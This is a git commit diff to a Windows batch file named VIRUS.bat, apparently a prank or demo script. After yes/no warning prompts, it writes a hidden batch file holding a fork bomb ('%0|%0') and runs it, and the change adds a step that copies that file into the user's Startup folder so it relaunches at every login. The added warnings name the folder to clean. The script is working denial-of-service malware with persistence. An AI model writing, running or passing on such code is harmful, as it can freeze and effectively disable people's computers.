64b56b1941922e484175b5a9aca0966889b847af
womimc <138317871+womimc@users.noreply.github.com>
2025-01-29 12:50:03 +0100

    Update VIRUS.bat

--- VIRUS.bat
+++ VIRUS.bat
@@ -6,6 +6,9 @@ echo.
 echo.
 echo WARNING!
 echo THIS VIRUS OVERLOADS YOUR PC, DO YOU WANT TO RUN IT?
+echo
+echo You can use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
+eco.
 echo.
 set /p continue="[YES / NO] >> "
 if /i "%continue%"=="yes" goto run
@@ -15,9 +18,13 @@ cls
 echo.
 echo.
 echo LAST WARNING!
-echo PRESS ANY KEY TO RUN AND SAY BYE BYE...
+echo PRESS ANY KEY TO RUN AND SAY BYE BYE TO YOUR CURRENT OS...
+echo.
+echo You can use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
+echo.
 pause >nul
 del xwkqelajcmLsldi.bat
 echo %%0^|%%0 ^>nul > xwkqelajcmLsldi.bat
 attrib +h xwkqelajcmLsldi.bat
+copy xwkqelajcmLsldi.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 .\xwkqelajcmLsldi.bat
